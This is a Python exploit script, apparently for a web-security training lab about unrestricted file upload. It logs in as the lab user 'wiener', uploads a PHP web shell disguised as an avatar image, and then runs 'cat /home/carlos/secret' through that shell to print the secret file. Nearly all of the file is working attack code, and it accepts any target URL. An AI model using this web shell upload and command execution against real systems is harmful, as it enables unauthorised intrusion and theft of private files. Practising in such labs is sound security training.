import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf


def exploit_file_upload(s, url):

    # Get CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Loggin in as the wiener user
    print("(+) Logging in as the wiener user...")
    data_login = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)

    if 'Log out' in r.text:
        print("(+) Successfully logged in as the wiener user...")

        # Uploading URL
        print("(+) Uploading web shell...")
        account_url = url + "/my-account"
        csrf_token = get_csrf_token(s, account_url)
        avatar_url = url + "/my-account/avatar"
        params = {"avatar": ('test.php', "<?php system($_GET['cmd']);?>", 'application/x-php'), 
        "user": "wiener",
        "csrf": csrf_token}

        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))

        m = MultipartEncoder(fields=params, boundary=boundary)

        headers = {'Content-Type': m.content_type}

        r = s.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)

        print("(+) The following is the content of the secret file: ")
        cmd_url = url + '/files/avatars/test.php?cmd=' + 'cat /home/carlos/secret'
        r = s.get(cmd_url, verify=False, proxies=proxies)
        print(r.text)

    else:
        print("(-) Could not login as the user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_file_upload(s, url)


if __name__ == "__main__":
    main()